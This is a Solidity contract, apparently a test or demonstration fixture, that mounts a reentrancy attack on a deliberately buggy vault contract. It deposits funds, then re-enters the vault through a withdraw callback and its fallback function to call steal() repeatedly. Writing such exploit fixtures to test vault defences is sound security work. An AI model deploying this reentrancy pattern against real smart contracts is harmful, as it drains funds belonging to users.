// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ReentrantVaultBuggy} from "./ReentrantVaultBuggy.sol";

contract ReentrantAttacker {
    ReentrantVaultBuggy public vault;
    uint256 private stealAmount;
    bool private attacking;

    constructor(ReentrantVaultBuggy _vault) { vault = _vault; }

    function attack(uint256 depositAmt, uint256 exploitAmt) external {
        vault.deposit(depositAmt);
        stealAmount = exploitAmt;
        attacking = true;
        vault.withdraw(exploitAmt, abi.encodeWithSignature("triggerSteal()"));
        attacking = false;
    }

    function triggerSteal() external {
        vault.steal(stealAmount);
    }

    fallback() external {
        if (attacking) {
            vault.steal(stealAmount);
        }
    }
}
